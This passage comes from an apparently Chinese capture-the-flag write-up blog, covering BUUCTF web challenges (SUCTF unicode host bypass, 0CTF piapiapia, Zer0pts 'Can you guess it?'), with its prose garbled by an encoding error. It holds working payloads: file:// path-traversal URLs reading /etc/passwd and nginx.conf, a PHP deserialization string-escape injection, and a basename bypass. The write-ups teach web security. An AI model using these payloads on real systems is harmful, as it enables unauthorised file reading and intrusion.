</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">    <span class="n">newhost</span><span class="o">=</span><span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">h</span> <span class="ow">in</span> <span class="n">host</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">newhost</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">h</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;idna&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">parts</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;.&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">newhost</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">finalUrl</span><span class="o">=</span><span class="n">urlunsplit</span><span class="p">(</span><span class="n">parts</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">host</span><span class="o">=</span><span class="n">parse</span><span class="o">.</span><span class="n">urlparse</span><span class="p">(</span><span class="n">finalUrl</span><span class="p">)</span><span class="o">.</span><span class="n">hostname</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">host</span> <span class="o">==</span> <span class="s1">&#39;suctf.cc&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span><span class="o">==</span><span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">get_unicode</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250221152007357.png"
	width="481"
	height="227"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250221152007357_hu5551560004665622978.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250221152007357_hu6169674456484732216.png 1024w"
	loading="lazy"
	
		alt="image-20250221152007357"
	
	
		class="gallery-image" 
		data-flex-grow="211"
		data-flex-basis="508px"
	
></p>
<p>ÂÖàurlÁºñÁ†ÅÔºåÂÜç‰º†ÂèÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/getUrl?url=file://suctf.c%E2%84%82/../../../../../etc/passwd
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ê†πÊçÆÈ¢òÁõÆÁöÑÊèêÁ§∫ÂæóÁü•ÔºåËøôÈáåÂ≠òÊúânginxÊúçÂä°Ë¥¥‰∏äÂè¶Â§ñÈÉ®ÂàÜnginxÁöÑÈÖçÁΩÆÊñá‰ª∂ÊâÄÂú®‰ΩçÁΩÆ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">ÈÖçÁΩÆÊñá‰ª∂Ôºö</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">nginx</span><span class="o">/</span><span class="n">conf</span><span class="o">/</span><span class="n">nginx</span><span class="o">.</span><span class="n">conf</span>
</span></span><span class="line"><span class="cl"><span class="err">ÈÖçÁΩÆÊñá‰ª∂Â≠òÊîæÁõÆÂΩïÔºö</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">nginx</span>
</span></span><span class="line"><span class="cl"><span class="err">‰∏ªÈÖçÁΩÆÊñá‰ª∂Ôºö</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">nginx</span><span class="o">/</span><span class="n">conf</span><span class="o">/</span><span class="n">nginx</span><span class="o">.</span><span class="n">conf</span>
</span></span><span class="line"><span class="cl"><span class="err">ÁÆ°ÁêÜËÑöÊú¨Ôºö</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib64</span><span class="o">/</span><span class="n">systemd</span><span class="o">/</span><span class="n">system</span><span class="o">/</span><span class="n">nginx</span><span class="o">.</span><span class="n">service</span>
</span></span><span class="line"><span class="cl"><span class="err">Ê®°ÂùóÔºö</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lisb64</span><span class="o">/</span><span class="n">nginx</span><span class="o">/</span><span class="n">modules</span>
</span></span><span class="line"><span class="cl"><span class="err">Â∫îÁî®Á®ãÂ∫èÔºö</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nginx</span>
</span></span><span class="line"><span class="cl"><span class="err">Á®ãÂ∫èÈªòËÆ§Â≠òÊîæ‰ΩçÁΩÆÔºö</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">nginx</span><span class="o">/</span><span class="n">html</span>
</span></span><span class="line"><span class="cl"><span class="err">Êó•ÂøóÈªòËÆ§Â≠òÊîæ‰ΩçÁΩÆÔºö</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">nginx</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/getUrl?url=file://suctf.c‚ÑÇ/../../../../../usr/local/nginx/conf/nginx.conf
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÊâæÂà∞flagÊâÄÂú®‰ΩçÁΩÆ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/getUrl?url=file://suctf.c‚ÑÇ/../../../../../usr/fffffflag
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="0ctf-2016piapiapia">[0CTF 2016]piapiapia
</h2><p>ÁõÆÂΩïÊâ´ÊèèÊúâwww.zip</p>
<p>‰∏ãËΩΩÊ∫êÁ†ÅÂèëÁé∞ÊúâÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÔºåË¶ÅËØªÂèñconfig.phpÊù•Ëé∑Âæóflag</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;phone&#39;</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;nickname&#39;</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;photo&#39;</span><span class="p">])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="nv">$username</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^\d{11}$/&#39;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;phone&#39;</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">			<span class="k">die</span><span class="p">(</span><span class="s1">&#39;Invalid phone&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\.[_a-zA-Z0-9]{1,10}$/&#39;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">			<span class="k">die</span><span class="p">(</span><span class="s1">&#39;Invalid email&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		
</span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[^a-zA-Z0-9_]/&#39;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;nickname&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;nickname&#39;</span><span class="p">])</span> <span class="o">&gt;</span> <span class="mi">10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="k">die</span><span class="p">(</span><span class="s1">&#39;Invalid nickname&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;photo&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;size&#39;</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">5</span> <span class="k">or</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;size&#39;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">1000000</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="k">die</span><span class="p">(</span><span class="s1">&#39;Photo size error&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="s1">&#39;upload/&#39;</span> <span class="o">.</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$profile</span><span class="p">[</span><span class="s1">&#39;phone&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;phone&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$profile</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$profile</span><span class="p">[</span><span class="s1">&#39;nickname&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;nickname&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$profile</span><span class="p">[</span><span class="s1">&#39;photo&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;upload/&#39;</span> <span class="o">.</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="nv">$user</span><span class="o">-&gt;</span><span class="na">update_profile</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$profile</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">		<span class="k">echo</span> <span class="s1">&#39;Update Profile Success!&lt;a href=&#34;profile.php&#34;&gt;Your Profile&lt;/a&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$profile</span>  <span class="o">==</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Location: update.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$profile</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$profile</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$phone</span> <span class="o">=</span> <span class="nv">$profile</span><span class="p">[</span><span class="s1">&#39;phone&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$email</span> <span class="o">=</span> <span class="nv">$profile</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$nickname</span> <span class="o">=</span> <span class="nv">$profile</span><span class="p">[</span><span class="s1">&#39;nickname&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$photo</span> <span class="o">=</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$profile</span><span class="p">[</span><span class="s1">&#39;photo&#39;</span><span class="p">]));</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$string</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$escape</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;\&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;\\\\&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$escape</span> <span class="o">=</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nx">implode</span><span class="p">(</span><span class="s1">&#39;|&#39;</span><span class="p">,</span> <span class="nv">$escape</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$string</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="nv">$escape</span><span class="p">,</span> <span class="s1">&#39;_&#39;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="nv">$safe</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;select&#39;</span><span class="p">,</span> <span class="s1">&#39;insert&#39;</span><span class="p">,</span> <span class="s1">&#39;update&#39;</span><span class="p">,</span> <span class="s1">&#39;delete&#39;</span><span class="p">,</span> <span class="s1">&#39;where&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$safe</span> <span class="o">=</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nx">implode</span><span class="p">(</span><span class="s1">&#39;|&#39;</span><span class="p">,</span> <span class="nv">$safe</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;/i&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="nv">$safe</span><span class="p">,</span> <span class="s1">&#39;hacker&#39;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈáåÂà©Áî®Ëøô‰∏™ËøáÊª§Âô®Êù•ÁªïËøáÔºåÂèÇËÄÉÂâçÈù¢ÁöÑphpÂèçÂ∫èÂàóÂåñÂ≠óÁ¨¶ÈÄÉÈÄ∏</p>
<p>Âú®nicknameÁöÑ‰ΩçÁΩÆÂÜôÂÖ•Â§ßÈáèÁöÑÈªëÂêçÂçï‰ΩøÂæóË¢´ÊõøÊç¢ÔºåÁÑ∂ÂêéÂ∞±ËÉΩÂåπÈÖçÂêéÈù¢‰º™ÈÄ†ÁöÑphotoÂÄºÔºåËØªÂèñconfig.php</p>
<p>ËøôÈáåÊàë‰ª¨Ë¶Å‰º™ÈÄ†ÁöÑphoto‰∏∫</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;;s:5:&#34;photo&#34;;s:10:&#34;config.php&#34;;}
</span></span></code></pre></td></tr></table>
</div>
</div><p>‰ΩÜÊòØÂõ†‰∏∫ÂâçÈù¢ÁöÑnicknameÊúâÈïøÂ∫¶ÈôêÂà∂Ë¶ÅÁî®Êï∞ÁªÑÁªïËøá</p>
<p>Âõ†‰∏∫Â∞ÜnicknameÊîπ‰∏∫Êï∞ÁªÑÊó∂ÔºåÂÆÉÂú®Â∫èÂàóÂåñÊó∂‰∏ç‰ºöÂÉèÂ≠óÁ¨¶‰∏ÄÊ†∑Èó≠ÂêàÔºåÊâÄ‰ª•Ë¶ÅÂä†Â§ö‰∏Ä‰∏™<code>}</code>„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;;}s:5:&#34;photo&#34;;s:10:&#34;config.php&#34;;}
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&#34;;}s:5:&#34;photo&#34;;s:10:&#34;config.php&#34;;}
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250223132907688.png"
	width="1362"
	height="555"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250223132907688_hu8267886857713824598.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250223132907688_hu8090525025974880684.png 1024w"
	loading="lazy"
	
		alt="image-20250223132907688"
	
	
		class="gallery-image" 
		data-flex-grow="245"
		data-flex-basis="588px"
	
></p>
<p>ÊîæÂåÖ‰πãÂêéÔºåÊääÂõæÁâáÁöÑbase64Ëß£Á†ÅÂá∫Êù•Â∞±Ë°å‰∫Ü</p>
<h2 id="zer0pts2020can-you-guess-it">[Zer0pts2020]Can you guess it?
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s1">&#39;config.php&#39;</span><span class="p">;</span> <span class="c1">// FLAG is defined in config.php
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/config\.php\/*$/i&#39;</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">exit</span><span class="p">(</span><span class="s2">&#34;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;source&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">highlight_file</span><span class="p">(</span><span class="nx">basename</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl">  <span class="k">exit</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$secret</span> <span class="o">=</span> <span class="nx">bin2hex</span><span class="p">(</span><span class="nx">random_bytes</span><span class="p">(</span><span class="mi">64</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;guess&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$guess</span> <span class="o">=</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;guess&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">hash_equals</span><span class="p">(</span><span class="nv">$secret</span><span class="p">,</span> <span class="nv">$guess</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$message</span> <span class="o">=</span> <span class="s1">&#39;Congratulations! The flag is: &#39;</span> <span class="o">.</span> <span class="nx">FLAG</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$message</span> <span class="o">=</span> <span class="s1">&#39;Wrong.&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;!doctype html&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;html lang=&#34;en&#34;&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">  &lt;head&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;meta charset=&#34;utf-8&#34;&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;title&gt;Can you guess it?&lt;/title&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">  &lt;/head&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">  &lt;body&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;h1&gt;Can you guess it?&lt;/h1&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;p&gt;If your guess is correct, I&#39;ll give you the flag.&lt;/p&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;p&gt;&lt;a href=&#34;?source&#34;&gt;Source&lt;/a&gt;&lt;/p&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;hr&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;?php if (isset($message)) { ?&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;?php } ?&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;form action=&#34;index.php&#34; method=&#34;POST&#34;&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">      &lt;input type=&#34;text&#34; name=&#34;guess&#34;&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">      &lt;input type=&#34;submit&#34;&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;/form&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">  &lt;/body&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/html&gt;
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>‰∏ãÈù¢ÈÇ£‰∏™hashÂåπÈÖçÈöèÊú∫Êï∞ËÇØÂÆö‰∏çË°åÔºåÁî®‰∏äÈù¢ÁöÑbasenameÁöÑbugÁªïËøá</p>
<p><a class="link" href="https://bugs.php.net/bug.php?id=62119"  target="_blank" rel="noopener"
    >PHP :: Bug #62119 :: basename broken with non-ASCII-chars</a></p>
<p>ÂÆÉ‰ºöÂéªÊéâÊñá‰ª∂ÂêçÂºÄÂ§¥ÁöÑÈùûASCIIÂÄºÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">var_dump</span><span class="p">(</span><span class="n">basename</span><span class="p">(</span><span class="s2">&#34;xffconfig.php&#34;</span><span class="p">));</span> <span class="o">//</span> <span class="o">=&gt;</span> <span class="n">config</span><span class="o">.</span><span class="n">php</span>
</span></span><span class="line"><span class="cl"><span class="n">var_dump</span><span class="p">(</span><span class="n">basename</span><span class="p">(</span><span class="s2">&#34;config.php/xff&#34;</span><span class="p">));</span> <span class="o">//</span> <span class="o">=&gt;</span> <span class="n">config</span><span class="o">.</span><span class="n">php</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÊ†∑Â∞±ËÉΩÁªïËøáÂåπÈÖçÔºåÁî®config.php/%ff</p>
<p>Âõ†‰∏∫basenameÂáΩÊï∞ÁöÑÁâπÊÄßÔºåÂÆÉ‰ºöËøîÂõûÊñá‰ª∂Âêç</p>
